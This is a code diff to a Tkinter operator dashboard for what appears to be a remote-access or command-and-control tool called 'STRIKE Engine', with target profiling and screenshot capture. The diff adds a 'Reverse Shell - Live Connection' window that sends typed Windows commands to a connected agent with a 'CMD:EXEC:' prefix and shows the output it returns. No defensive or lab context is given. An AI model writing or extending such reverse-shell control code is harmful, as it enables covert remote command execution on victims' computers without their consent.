@@ -149,9 +149,15 @@ class Dashboard(tk.Tk):
         self.lbl_agent_ip.pack(side="right", padx=10)
 
         # --- TARGET PROFILE BUTTON ---
-        tk.Button(inner_top, text="⬡ TARGET PROFILE", font=("Segoe UI", 9, "bold"),
+        tk.Button(inner_top, text="~_~ TARGET PROFILE", font=("Segoe UI", 9, "bold"),
                   bg="#a29bfe", fg="#090b14", relief="flat", padx=10, pady=2, cursor="hand2",
                   command=self._show_target_profile).pack(side="right", padx=10)
+        # ----------------------------------
+
+        # --- NEW: REMOTE SHELL BUTTON ---
+        tk.Button(inner_top, text=">_ REMOTE SHELL", font=("Segoe UI", 9, "bold"),
+                  bg="#38b6ff", fg="#090b14", relief="flat", padx=10, pady=2, cursor="hand2",
+                  command=self._show_remote_shell).pack(side="right", padx=10)
         # ----------------------------------
 
         # Thin accent line
@@ -432,7 +438,21 @@ class Dashboard(tk.Tk):
             self._target_sys_info = pkt["data"] 
         elif t == "screenshot_resp":                  
             self._save_screenshot(pkt["data"])
+        elif t == "cmd_output":                       
+            self._handle_shell_output(pkt["data"])
 
+    def _handle_shell_output(self, output_text):
+        """Prints the terminal output returned from the agent"""
+        if hasattr(self, "shell_win") and self.shell_win.winfo_exists():
+            self.shell_output.config(state="normal")
+            
+            # Format the output with an extra newline and the prompt arrow
+            if output_text.strip():
+                self.shell_output.insert("end", f"{output_text}\n")
+            self.shell_output.insert("end", "\n> ")
+            
+            self.shell_output.see("end")
+            self.shell_output.config(state="disabled")
     def _save_screenshot(self, b64_data):
         """Decodes the incoming screenshot and saves it to disk"""
         try:
@@ -644,6 +664,66 @@ class Dashboard(tk.Tk):
         # Close Button
         tk.Button(win, text="CLOSE REPORT", font=("Segoe UI", 10, "bold"), bg=BORDER, fg=WHITE, 
                   relief="flat", command=win.destroy).pack(pady=15)
+
+    def _show_remote_shell(self):
+        """Creates the Remote Terminal UI"""
+        if not self._conn:
+            messagebox.showerror("Error", "Agent is not connected.")
+            return
+
+        # Prevent opening multiple shell windows
+        if hasattr(self, "shell_win") and self.shell_win.winfo_exists():
+            self.shell_win.focus()
+            return
+
+        self.shell_win = tk.Toplevel(self)
+        self.shell_win.title("Reverse Shell - Live Connection")
+        self.shell_win.geometry("750x500")
+        self.shell_win.configure(bg="#000000") # Pure black for terminal feel
+
+        # Output Area (The Console)
+        self.shell_output = scrolledtext.ScrolledText(self.shell_win, bg="#0a0a0a", fg="#00ff00", 
+                                                      font=("Consolas", 10), insertbackground="#00ff00")
+        self.shell_output.pack(fill="both", expand=True, padx=10, pady=10)
+        self.shell_output.insert("end", "STRIKE Engine - Remote Shell Established.\nType 'help' or any Windows CMD command.\n\n> ")
+        self.shell_output.config(state="disabled")
+
+        # Input Area (The Command Line)
+        input_frame = tk.Frame(self.shell_win, bg="#000000")
+        input_frame.pack(fill="x", padx=10, pady=(0, 10))
+
+        tk.Label(input_frame, text="PS C:\\> ", font=("Consolas", 11, "bold"), fg="#38b6ff", bg="#000000").pack(side="left")
+        
+        self.shell_input = tk.Entry(input_frame, font=("Consolas", 11), bg="#111111", fg="#ffffff", insertbackground="#ffffff", relief="flat")
+        self.shell_input.pack(side="left", fill="x", expand=True, padx=5, ipady=4)
+        
+        # Pressing Enter sends the command
+        self.shell_input.bind("<Return>", lambda event: self._send_shell_command())
+
+        tk.Button(input_frame, text="EXECUTE", font=("Segoe UI", 9, "bold"), bg="#38b6ff", fg="#000000", 
+                  relief="flat", cursor="hand2", command=self._send_shell_command).pack(side="right", padx=5)
+        
+        self.shell_input.focus() # Auto-focus the typing cursor
+
+    def _send_shell_command(self):
+        """Sends the typed command to the agent"""
+        cmd = self.shell_input.get().strip()
+        if not cmd:
+            return
+        
+        # Clear the input box and echo the command to the screen
+        self.shell_input.delete(0, "end")
+        self.shell_output.config(state="normal")
+        self.shell_output.insert("end", f"{cmd}\n", "cmd")
+        self.shell_output.tag_config("cmd", foreground="#ffffff")
+        self.shell_output.config(state="disabled")
+        self.shell_output.see("end")
+
+        try:
+            # Send the command with our special prefix
+            self._conn.sendall(f"CMD:EXEC:{cmd}".encode("utf-8"))
+        except Exception as e:
+            messagebox.showerror("Error", "Lost connection to agent.", parent=self.shell_win)
 
     def _on_close(self):
         self._running = False
